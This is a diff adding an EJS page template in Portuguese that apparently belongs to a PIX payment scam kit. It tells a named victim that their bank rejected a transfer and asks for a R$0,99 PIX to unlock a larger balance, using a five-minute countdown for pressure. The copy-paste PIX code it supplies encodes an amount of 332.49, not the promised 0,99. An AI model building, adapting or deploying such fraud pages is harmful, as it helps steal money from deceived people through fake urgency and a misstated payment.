@@ -1,0 +1,102 @@
+<%- include('components/header'); %>
+
+
+    <body class="gradient">
+ 
+        <div id="site">
+
+
+            <div class="section">
+
+  
+
+
+                <div class="mt-1">
+                   <h1>ERRO PIXR05</h1>
+
+
+                </div>
+
+                <p  class="sub-texto load font15" style="text-align:left">
+                    <b><%-socialproof.name%>, seu Banco rejeitou</b> nossa transferência via PIX para você</b>.
+                    <br>
+                    <br><b>Para Resolver isso</b>, faça um pix no valor de <b style="color:#00ad42">R$ 0,99 centavos</b>.
+
+                </p>
+                <span class="sub-texto load font15" style="color: #e02d00;">Última tentativa de transferência em: </span>
+                <h1>
+                   
+             
+                    
+                    <span id="time" style="font-size: 60px;">05:00</span>  </h1>
+                <p>
+                   
+                </p>
+
+
+                <div class="code_sec">
+                    <div class="d-flex flex-row flex-wrap justify-content-center btn_code cp_section">
+                    <input type="text" class="clipboardtext" id="cod-pix" value="00020126580014br.gov.bcb.pix01361ec85d24-0fac-4576-b085-8ec9e5c537965204000053039865406332.495802BR5912HARMONIA LAR6006Osasco62240520mpqrinter22394967034630482B0">
+                    <button class="copy_btn" onclick="copyToClipboard()"> <img src="/assets/images/copy.png"><span class="">Copiar</span></button>
+                    </div>
+                    </div>
+
+
+                    <div class="content-box thank_sec_2">
+                        <div class="row">
+                        <div class="col-md-12" style="padding-right: 15px;
+                        padding-left: 15px;">
+                   
+                        <h2 class="font-weight-bold">Envie 0,99 e receba <b style="color:#00ad42">R$<%-balance%></b>.</h2>
+                        <ul class="print_pay">
+                        <li><a href="#"><span><img src="/assets/images/print.svg"></span> <b>Copie o código</b> acima clicando no botão</a></li>
+                        <li><a href="#"><span><img src="/assets/images/mobil.svg"></span>Abra o aplicativo de seu banco e selecione <b>Copia e Cola</b> na opção de <b>pagamento por PIX</b>.</a></li>
+                        </ul>
+                        </div>
+                        </div>
+                        </div>
+
+            </div>
+
+     
+
+            <div class="section load" style="min-height: 50%;">
+                <br>
+            
+
+            </div>
+           
+
+
+        
+        </div>
+        </div>
+        <script src="https://code.jquery.com/jquery-2.2.4.min.js"
+            integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+        <%- include('components/footer'); %>
+            
+            <script>   
+             <%-include('assets/output/js/compratilhe')%>
+            
+            function copyToClipboard() {
+                /* Get the text field */
+                var copyText = document.getElementById("cod-pix");
+                /* Select the text field */
+                copyText.select();
+                copyText.setSelectionRange(0, 99999); /*For mobile devices*/
+                /* Copy the text inside the text field */
+                document.execCommand("copy");
+                /* Alert the copied text */
+                //$('#copiedBarcodeModal').modal('show');
+                alert("Copiado!");
+                $("#alert-note").show(1000);
+            }
+         
+            </script>
+    </body>
+
+
+
+
+    </html>
